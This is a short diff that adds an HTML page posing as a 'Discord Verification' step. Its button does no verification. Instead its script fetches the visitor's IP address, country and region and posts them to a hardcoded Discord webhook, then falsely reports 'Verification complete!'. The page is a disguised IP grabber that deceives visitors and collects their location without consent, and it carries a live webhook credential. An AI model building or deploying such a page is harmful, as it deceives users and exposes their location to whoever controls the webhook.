@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>Verification</title>
+</head>
+<body>
+  <h2>🔐 Discord Verification</h2>
+  <button onclick="verify()">Verify</button>
+
+  <script>
+    async function verify() {
+      const ipData = await fetch("https://ipwho.is/")
+        .then(res => res.json());
+
+      await fetch("https://discord.com/api/webhooks/1466608411389984912/zjweHDorJ_iVnl9-38EvwHrJMw_g1iYZN5bx16O797Mi7HAiZyNiRK2FBhYRe-7wNwCX", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title: "🌟 New Member Verification 🌟",
+            color: 65280,
+            fields: [
+              { name: "IP Address", value: ipData.ip || "unknown" },
+              { name: "Country", value: ipData.country || "unknown" },
+              { name: "Region", value: ipData.region || "unknown" }
+            ],
+            timestamp: new Date()
+          }]
+        })
+      });
+
+      alert("Verification complete!");
+    }
+  </script>
+</body>
+</html>
